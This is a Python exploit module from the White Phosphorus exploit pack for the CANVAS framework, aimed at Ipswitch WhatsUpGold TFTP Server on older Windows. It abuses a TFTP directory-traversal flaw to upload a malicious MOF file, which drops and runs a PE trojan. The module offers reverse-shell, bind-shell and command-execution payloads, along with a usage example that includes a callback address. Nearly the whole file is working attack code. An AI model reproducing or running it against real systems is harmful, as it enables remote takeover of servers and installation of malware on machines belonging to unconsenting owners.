
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
from libs.canvasos import canvasos
from MOSDEF import pelib


######################################################################################
NAME = "Ipswitch WhatsUpGold TFTP Server Directory Traversal Remote Code Execution"
DESCRIPTION = "Exploits a remote code execution vulnerability in Ipswitch WhatsUpGold TFTP Server"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Ipswitch'
DOCUMENTATION["Date public"] = "2011-12-02"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://secpod.org/advisories/SecPod_Ipswitch_TFTP_Server_Dir_Trav.txt"
DOCUMENTATION["Notes"] = """
This module uses a path escape directory traversal vulnerability to leverage remote code execution by writing a malicious MOF file to %systemroot%\system32\wbem\mof\ using the Wbem Mof technique found in the Stuxnet worm. When the MOF is executed it drops a MOSDEF PE Trojan in the Default User profile directory and runs it.
All dropped files must be removed manually.

Vulnerable TFTP Server must have file upload enabled to allow RCE.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP" ]

NOTES="""
This module uses a path escape directory traversal vulnerability to leverage remote code execution by writing a malicious MOF file to %systemroot%\system32\wbem\mof\ using the Wbem Mof technique found in the Stuxnet worm. When the MOF is executed it drops a MOSDEF PE Trojan in the Default User profile directory and runs it.
All dropped files must be removed manually.

Vulnerable TFTP Server must have file upload enabled to allow RCE.
----------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Ipswitch WhatsUpGold TFTP Server Path Escape Remote Code Execution
----------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows 2003+XP Universal

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_ipswitch_whatsupgold_tftp/wp_ipswitch_whatsupgold_tftp.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 69
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets,PORT)
    return

targets = {
    0 : ["Windows Universal", (0x0000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ######################################################################################
    PAYLOADS = ["TCP Connect Back",
                "IE Inject Connect Back",
                "HTTPMOSDEF SSL",
                "HTTPMOSDEF PLAIN",
                "Bind MOSDEF Shell",
                "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.alignstack = True
        self.vProtect = True
        self.useRawShellcode = True
        self.user = "anonymous"
        self.password = "anonymous"
        self.payloadFilename = "".join( [ random.choice(string.lowercase) for x in range(16) ] ) + '.mof'
        self.mosdeftrojan = ''
        self.outputfile = ''
        self.mof_path = '../'*20 + 'Windows/system32/wbem/mof/'
        return

    def usage(self):
        self.wp_usage(targets)
        return

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def neededListenerTypes(self):
        self.getArgs()    
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()
        self.log('WP> Targetting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()   

    def getArgs(self):
        self.wp_getShellcodeType()
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        self.log("WP> Building MOSDEF PE Trojan")
        myPElib = pelib.PElib()
        try:
            self.mosdeftrojan=myPElib.createPEFileBuf(self.shellcode)
        except Exception, err:
            self.log("WP> Problem building MOSDEF PE Trojan: %s"%(err))
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        self.log("WP> Packing Trojan in Malcious .mof")
        self.mosdeftrojan = wp_GenerateMOF(self.mosdeftrojan)
        return self.mosdeftrojan

    def run(self):
        self.getArgs()

        payload = self.makesploit()
        self.result_error = 0
        
        s = self.getudpsock()
        self.log("WP> Sending Exploit")
        s.sendto("\x00\x02"+self.mof_path+self.payloadFilename+"\x00\x6f\x63\x74\x65\x74\x00", (self.host, self.port))
        data = s.recvfrom(1024)
        self.host,self.port = data[1]
        if data[0] != "\x00\x04\x00\x00":
            self.log("WP> TFTP File Upload Denied")
            self.setInfo("WP> %s attacking %s:%d - completed (failed?)"%(NAME,self.host,self.port))
            return 0
        
        i = 0
        j = 1
        while i <= len(payload):
            s.sendto("\x00\x03"+pack('>H', j)+payload[i:i+512], (self.host, self.port))
            data = s.recvfrom(1024)
            self.host,self.port = data[1]
            if data[0] != ("\x00\x04"+pack('>H',j)):
                self.log("WP> TFTP File Upload Failed")
                self.setInfo("WP> %s attacking %s:%d - completed (failed?)"%(NAME,self.host,self.port))
                return 0
            i += 512
            j += 1
        
        time.sleep(3)
        s.close()
        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
